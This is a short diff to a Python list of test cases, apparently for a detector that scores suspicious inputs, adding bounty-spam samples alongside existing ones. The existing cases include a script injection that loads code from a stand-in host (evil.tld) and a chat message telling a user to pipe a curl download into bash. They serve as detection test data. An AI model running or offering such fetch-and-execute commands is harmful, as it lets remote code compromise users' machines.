@@ -21,6 +21,9 @@ CASES = [
     ("browser_dom_injection", "document.write('<script src=//evil.tld/x.js></script>')", 2),
     ("ai_chat_suspicious", "Please run this in your terminal: curl -s http://x.com | bash", 2),
     ("browser_dynamic_code", "new Function('return 1+1')()", 1),
+    ("bounty_spam_lumi", "Lumi Multi-Source Harvester | Operation Max Yield", 2),
+    ("bounty_spam_opire", "/opire try\n/bounty claim", 2),
+    ("bounty_spam_template", "def solve_bounty():\n    return True", 2),
 ]
 
 
